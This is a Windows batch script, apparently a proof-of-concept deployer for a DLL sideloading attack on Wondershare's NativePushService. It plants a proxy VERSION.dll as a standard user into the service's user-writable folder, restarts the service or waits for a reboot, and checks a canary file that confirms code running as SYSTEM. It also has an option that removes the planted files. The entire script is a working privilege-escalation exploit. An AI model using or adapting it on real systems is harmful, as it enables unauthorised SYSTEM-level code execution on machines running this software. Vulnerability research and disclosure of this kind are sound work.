@echo off
REM VADER SIDELOAD DEPLOYMENT -- NativePushService / VERSION.dll
REM ============================================================
REM Run as STANDARD USER to plant the DLL.
REM Service restart requires elevation or reboot.
REM
REM Usage:
REM   deploy.bat          -- plant DLL only
REM   deploy.bat restart  -- plant DLL + restart service (needs admin)
REM   deploy.bat check    -- check if canary was written
REM   deploy.bat clean    -- remove planted DLL + canary

set TARGET="C:\Users\apacw\AppData\Local\Wondershare\Wondershare NativePush"
set CANARY="C:\Windows\Temp\VADER_SYSTEM_CANARY.txt"

if "%1"=="check" goto :check
if "%1"=="clean" goto :clean
if "%1"=="restart" goto :deploy_restart

:deploy
echo [*] Planting VERSION.dll proxy...
copy /Y version.dll %TARGET%\VERSION.dll
if errorlevel 1 (
    echo [!] FAILED -- cannot write to target directory
    exit /b 1
)
echo [+] DLL planted. Service will load on next restart/reboot.
echo [*] To restart service now (requires admin):
echo     sc stop NativePushService ^&^& sc start NativePushService
echo [*] Or reboot. Service is Auto-start.
echo [*] After service restart, run: deploy.bat check
goto :eof

:deploy_restart
echo [*] Planting VERSION.dll proxy...
copy /Y version.dll %TARGET%\VERSION.dll
if errorlevel 1 (
    echo [!] FAILED -- cannot write to target directory
    exit /b 1
)
echo [+] DLL planted.
echo [*] Restarting NativePushService (requires admin)...
sc stop NativePushService
timeout /t 3 /nobreak >nul
sc start NativePushService
timeout /t 2 /nobreak >nul
goto :check

:check
echo [*] Checking for canary...
if exist %CANARY% (
    echo [+] SYSTEM EXECUTION CONFIRMED
    echo ==============================
    type %CANARY%
) else (
    echo [-] Canary not found. Service may not have restarted yet.
    echo [*] Service state:
    sc query NativePushService | findstr STATE
)
goto :eof

:clean
echo [*] Cleaning up...
del %TARGET%\VERSION.dll 2>nul
del %CANARY% 2>nul
echo [+] Cleaned.
goto :eof
